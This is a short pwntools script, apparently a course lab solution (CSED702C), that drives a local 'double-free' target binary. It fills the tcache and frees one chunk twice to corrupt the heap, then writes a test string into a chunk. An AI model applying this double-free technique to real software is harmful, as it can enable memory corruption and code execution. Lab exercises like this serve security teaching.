from pwn import *

p = process('/home/lab11/double-free/target')

context.log_level = 'debug'

for i in range(9):
    p.sendline(b'1')
    p.sendline(str(i).encode())
    p.sendline(b'32')

for i in range(7):
    p.sendline(b'2')
    p.sendline(str(i).encode())
    
p.sendline(b'2')
p.sendline(b'7')

p.sendline(b'2')
p.sendline(b'8')

p.sendline(b'2')
p.sendline(b'7')

for i in range(7):
    p.sendline(b'1')
    p.sendline(str(i).encode())
    p.sendline(b'32')
    
p.sendline(b'4')
    
p.sendline(b'1')
p.sendline(b'7')
p.sendline(b'32')

p.sendline(b'1')
p.sendline(b'8')
p.sendline(b'32')

p.sendline(b'3')
p.sendline(b'8')
p.sendline(b'CSED702C is super fun!')

p.interactive()